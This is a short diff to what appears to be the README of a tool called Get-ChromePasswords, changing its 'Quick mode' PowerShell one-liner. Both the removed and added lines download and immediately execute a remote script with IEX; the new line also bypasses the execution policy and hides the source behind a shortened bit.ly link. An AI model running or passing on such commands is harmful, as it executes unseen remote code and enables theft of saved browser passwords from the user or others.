@@ -19,6 +19,6 @@
 ## Quick mode...
 
 ```PowerShell
-  PS C:\> IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/et0x/Get-ChromePasswords/master/Get-ChromePasswords.ps1"))
+  C:\> powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://bit.ly/2xQhUMu'))"
 ```
 
